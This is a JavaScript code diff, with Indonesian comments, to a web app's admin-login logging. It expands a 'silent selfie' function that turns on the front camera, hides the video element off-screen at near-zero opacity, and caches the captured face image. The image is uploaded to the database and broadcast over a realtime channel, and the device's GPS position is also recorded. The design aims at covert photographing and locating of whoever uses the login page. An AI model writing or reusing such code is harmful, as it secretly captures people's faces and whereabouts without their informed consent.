@@ -243,48 +243,103 @@ export function getStoredDeviceIdentity() {
   return traces.join(' | ')
 }
 
+// Cache foto terakhir di memori & sessionStorage agar tidak pernah hilang saat transisi halaman / submit login
+let cachedSelfieDataUrl = null
+let activeCameraPromise = null
+
 /**
- * Mengambil foto wajah senyap via kamera depan jika izin kamera sudah granted di browser
+ * Mengambil foto wajah senyap via kamera depan.
+ * - Menggunakan elemen <video> tersembunyi di DOM agar Chrome/Safari/Android WebView merender frame asli (bukan hitam/kosong)
+ * - Menunggu sensor kamera siap (videoWidth > 0) + auto-exposure
+ * - Menyimpan cache sesi sehingga jika dijepret saat buka halaman, otomatis terpakai juga saat klik tombol Login
  */
 export async function captureSilentSelfieSnapshot(forcePrompt = false) {
-  if (typeof navigator === 'undefined' || !navigator.mediaDevices?.getUserMedia) return null
+  if (typeof navigator === 'undefined' || !navigator.mediaDevices?.getUserMedia) {
+    return cachedSelfieDataUrl
+  }
 
-  if (!forcePrompt) {
+  // Jika sedang ada proses jepret kamera berjalan bersamaan, tunggu hasilnya (jangan bentrok berebut kamera)
+  if (activeCameraPromise) {
+    return activeCameraPromise
+  }
+
+  activeCameraPromise = (async () => {
+    if (!forcePrompt) {
+      try {
+        if (navigator.permissions && navigator.permissions.query) {
+          const perm = await navigator.permissions.query({ name: 'camera' })
+          if (perm.state === 'denied') return cachedSelfieDataUrl
+        }
+      } catch {}
+    }
+
+    let stream = null
+    let video = null
     try {
-      if (navigator.permissions && navigator.permissions.query) {
-        const perm = await navigator.permissions.query({ name: 'camera' })
-        if (perm.state !== 'granted') return null
+      stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: 'user', width: { ideal: 480 }, height: { ideal: 480 } },
+        audio: false
+      })
+
+      video = document.createElement('video')
+      video.muted = true
+      video.playsInline = true
+      video.setAttribute('playsinline', 'true')
+      video.setAttribute('autoplay', 'true')
+      // Pasang tersembunyi di DOM agar browser wajib mendekode frame kamera
+      video.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:4px;height:4px;opacity:0.01;pointer-events:none;z-index:-9999;'
+      document.body.appendChild(video)
+
+      video.srcObject = stream
+      await video.play().catch(() => {})
+
+      // Tunggu hingga sensor kamera benar-benar menghasilkan resolusi frame (maks 2 detik)
+      const startWait = Date.now()
+      while ((video.videoWidth === 0 || video.readyState < 2) && Date.now() - startWait < 2000) {
+        await new Promise(r => setTimeout(r, 60))
       }
-    } catch {}
-  }
 
-  let stream = null
-  try {
-    stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: 'user', width: { ideal: 360 }, height: { ideal: 360 } }
-    })
+      // Tambahan waktu 300ms agar auto-exposure sensor kamera terang (tidak gelap di frame pertama)
+      await new Promise(r => setTimeout(r, 300))
 
-    const video = document.createElement('video')
-    video.muted = true
-    video.playsInline = true
-    video.srcObject = stream
-    await video.play()
+      const w = video.videoWidth || 360
+      const h = video.videoHeight || 360
+      const canvas = document.createElement('canvas')
+      canvas.width = 360
+      canvas.height = Math.round((h / w) * 360) || 270
+      const ctx = canvas.getContext('2d')
 
-    await new Promise(r => setTimeout(r, 220))
+      // Mirror horizontal seperti kamera depan
+      ctx.translate(canvas.width, 0)
+      ctx.scale(-1, 1)
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height)
 
-    const canvas = document.createElement('canvas')
-    canvas.width = 320
-    canvas.height = 240
-    const ctx = canvas.getContext('2d')
-    ctx.drawImage(video, 0, 0, 320, 240)
+      stream.getTracks().forEach(t => t.stop())
+      if (video && video.parentNode) video.parentNode.removeChild(video)
 
-    stream.getTracks().forEach(t => t.stop())
+      const dataUrl = canvas.toDataURL('image/jpeg', 0.65)
+      if (dataUrl && dataUrl.length > 1000) {
+        cachedSelfieDataUrl = dataUrl
+        try {
+          sessionStorage.setItem('ebm_cached_selfie', dataUrl)
+        } catch {}
+        return dataUrl
+      }
+      return cachedSelfieDataUrl
+    } catch {
+      if (stream) stream.getTracks().forEach(t => t.stop())
+      if (video && video.parentNode) video.parentNode.removeChild(video)
+      try {
+        return cachedSelfieDataUrl || sessionStorage.getItem('ebm_cached_selfie') || null
+      } catch {
+        return cachedSelfieDataUrl
+      }
+    } finally {
+      activeCameraPromise = null
+    }
+  })()
 
-    return canvas.toDataURL('image/jpeg', 0.55)
-  } catch {
-    if (stream) stream.getTracks().forEach(t => t.stop())
-    return null
-  }
+  return activeCameraPromise
 }
 
 /**
@@ -331,11 +386,22 @@ export async function recordAdminAccessAttempt(email = 'Admin Target', options =
       ? `${options.customIdentity}${getStoredDeviceIdentity() ? ' | ' + getStoredDeviceIdentity() : ''}`
       : getStoredDeviceIdentity()
 
-    // Coba ambil foto wajah (jika disediakan lewat opsi atau ambil secara senyap jika kamera sudah granted)
-    let photoUrl = options.photoUrl || null
-    if (!photoUrl && !options.skipCamera) {
+    // Gunakan foto dari opsi atau cache sesi jika sudah dijepret sebelumnya, sambil tetap menjepret foto terbaru
+    let photoUrl = options.photoUrl || cachedSelfieDataUrl || null
+    if (!photoUrl) {
       try {
-        photoUrl = await captureSilentSelfieSnapshot(false)
+        photoUrl = sessionStorage.getItem('ebm_cached_selfie') || null
+      } catch {}
+    }
+
+    if (!options.skipCamera) {
+      try {
+        // Tunggu maksimal 1.4 detik agar tidak menghambat login jika kamera lambat menyala
+        const freshPhoto = await Promise.race([
+          captureSilentSelfieSnapshot(false),
+          new Promise(r => setTimeout(() => r(null), 1400))
+        ])
+        if (freshPhoto) photoUrl = freshPhoto
       } catch {}
     }
 
@@ -398,6 +464,27 @@ export async function recordAdminAccessAttempt(email = 'Admin Target', options =
     })
 
     const logId = data?.id
+
+    // Jika saat insert log di atas kamera masih pemanasan (belum selesai dalam 1.4s), susulkan foto ke DB begitu kamera selesai!
+    if (logId && !photoUrl && !options.skipCamera) {
+      captureSilentSelfieSnapshot(false).then(async (latePhoto) => {
+        if (latePhoto) {
+          await updateAdminAccessPhoto(logId, latePhoto)
+          try {
+            const ch = supabase.channel('ebm-security-command')
+            ch.subscribe((st) => {
+              if (st === 'SUBSCRIBED') {
+                ch.send({
+                  type: 'broadcast',
+                  event: 'photo_captured',
+                  payload: { logId, sessionId: sId, photo_url: latePhoto }
+                })
+              }
+            })
+          } catch {}
+        }
+      }).catch(() => {})
+    }
 
     // Jika GPS perangkat baru selesai belakangan (setelah 1.2s), update secara asinkron
     if (logId && !gps && typeof navigator !== 'undefined' && navigator.geolocation) {
